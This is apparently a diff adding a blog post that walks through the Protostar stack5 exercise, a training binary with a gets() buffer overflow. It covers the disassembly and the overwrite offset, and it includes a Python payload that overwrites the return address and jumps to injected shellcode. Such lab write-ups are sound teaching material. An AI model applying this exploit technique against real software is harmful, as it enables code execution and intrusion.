@@ -1,0 +1,199 @@
+---
+layout: post
+title:  "Protostar Exploit Exercises: Stacks Part Two"
+---
+
+*If your just joining us, this is the second part of me trying to solve the Protostar
+exploit exercises. You can read the [Previous post]({% post_url 2015-09-12-protostar-part-one %})
+if you want to.*
+
+I have been struggling with this level for quite some time. Every time I think I got it right,
+the memory-corruption gods smack me back down to earth. Previously I've been solving the 
+protostar stack-challenges without a complete understanding of how things were happening.
+
+Since then I've read
+[this book](http://www.amazon.com/Assembly-Language-Step-Step-Programming/dp/0470497025),
+and recently really just sat down allowed myself not to rush through
+this challenge.
+
+By writing this post - I mostly tought myself what's going on.
+
+Pro-tip: putting things on the stack moves down in memory, taking things off moves up in memory.
+
+## [stack5](https://exploit-exercises.com/protostar/stack5)
+
+>Stack5 is a standard buffer overflow, this time introducing shellcode.
+>
+>This level is at /opt/protostar/bin/stack5
+>
+>Hints
+>
+> + At this point in time, it might be easier to use someone elses shellcode
+> + If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
+> + remove the int3s once your shellcode is done.
+
+Let's have a look at the code.
+
+{% highlight c %}
+
+int main(int argc, char **argv)
+{
+  char buffer[64]; // array of 64 elements allocated on the stack
+
+  gets(buffer); // fill it with all the things
+}
+{% endhighlight %}
+*Listing 1-0: Excerpt from stack5.c*
+
+Let's have a look in gdb.
+
+~~~
+$ gdb -q stack5
+(gdb) set disassembly-flavor intel
+(gdb) disassemble
+~~~
+*Listing 1-1: Starting gdb*
+
+{% highlight nasm %}
+push ebp                    ; save frame pointer on the stack
+mov ebp, esp                ; new frame pointer
+and esp, 0xfffffff0         ; align esp to 16 bytes
+sub esp, 0x50               ; make room for 80 bytes on the stack
+lea eax, [esp+0x10]         ; Load the address of the array into eax
+mov DWORD PTR [esp], eax    ; save the address on the stack
+call 0x80482e8 <gets@plt>   ; call gets
+leave                       ; move ebp into esp & pop ebp
+ret                         ; return to caller
+{% endhighlight %}
+*Listing 1-2: Disassembly of main from stack5*
+
+I made the following simplification of what's going on after the
+alignment of esp & before the call to gets. Let's assume for
+simplicity that esp is initially 100.
+
+## Step 1
+
+esp is decremented by 80 (hex 50) to make room for the array.
+
+~~~
+ 20 | | <- esp
+ 21 | |
+ ...
+ 99 | |
+100 | | # esp was pointing here before :)
+~~~
+
+## Step 2
+
+esp is adjusted by incrementing it by 16 (-80+16= -64), and it's
+saved in the eax register.
+   
+~~~
+ 20 | | <- esp
+ 21 | |
+ ...
+ 35 | |
+ 36 | | <- eax
+~~~
+
+## Step 3
+
+Save the pointer on the stack
+
+~~~
+ 19 |    |
+ 20 | 36 | <- esp
+ 21 |    |
+~~~
+
+Here's a couple of screenshots, illustrating in gdb what's going on with the 
+actual memory that holds the input.
+
+*Note that a array of 64 `A`s in C still has a length of 65, since the
+array is terminated by null.*
+
+![Feeding the program 64 As]({{ site-url }}/assets/post_images/protostar_part2_63A.png)
+*Figure 1-0: Feeding the program 63 As*
+ 
+![Feeding the program 64 As]({{ site-url }}/assets/post_images/protostar_part2_64A.png)
+*Figure 1-1: Feeding the program 64 As*
+
+![Feeding the program 65 As]({{ site-url }}/assets/post_images/protostar_part2_65A.png)
+*Figure 1-2: Feeding the program 65 As*
+
+As you can see, our array is slowly eating away at the data on the
+stack, in our case `0xbffff7c0`.
+
+Those pieces of bits are popped of the stack in the `leave`
+instruction. The following `ret` instruction basically pops the top of the stack
+into eip & execution procedes at the new location pointed at by eip.
+
+We can find out what part of the stack we need to overwrite by
+examining the top of the stack just before executing the `ret` instruction.
+
+![Top of the stack before ret]({{ site-url }}/assets/post_images/protostar_part2_before_ret.png)
+
+*Figure 1-3: Examining the top of the stack before executing `ret`*
+
+How many bytes do we need to feed the program to overwrite that piece of memory?
+
+We just subtract our goal with the address of our array & get how many bytes we need to feed.
+
+0xbffff7c0 - 0xbffff770 = 0x50 (decimal 80)
+
+That's neat!
+
+A array of 80 characters would completely overwrite the address popped by ret, Right?
+
+![Success! (I think)]({{ site-url }}/assets/post_images/protostar_part2_experiment.png)
+
+*Figure 1-4: Overwriting the instruction pointer by feeding the program 80 `A`s*
+
+Right.
+
+Let's place some instructions in the buffer, along with some garbage, ending with
+the address which points to our buffer. I used some python to generate the payload.
+
+{% highlight python %}
+# Just some int 3 operations
+shellcode = '\xcc\xcc\xcc\xcc'
+# location can be automagically generated by python via
+# struct module. Like so:
+#  import struct
+#  struct.pack(0xbffff780)
+location = '\x80\xf7\xff\xbf'
+print(shellcode + 'A'*72 + location)
+{% endhighlight %}
+
+When fed into the program, our shellcode executes - It does absolutely nothing.
+But it's there, executing :)
+
+So we're close, but we still need to figure out some shellcode that we would want to use.
+
+This, hopefully is the easy part. We just go to google, type shellcode & press enter.
+
+I stumbled upon [this](https://www.exploit-db.com/exploits/37289/) over at exploit-db.
+
+Since the shellcode's length is larger than our 4 instructions, we adjust the amount of `A`s
+we're feeding & it should work just fine.
+
+![Hurrah!]({{ site-url }}/assets/post_images/protostar_part2_success.png)
+
+Thanks for reading.
+
++ Shoutouts to [hasherezade](https://twitter.com/hasherezade)
+
++ Great [paper](http://www.dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html) on how Linux programs actually start 
+
+
+
+
+
+
+
+
+
+
+
+
+
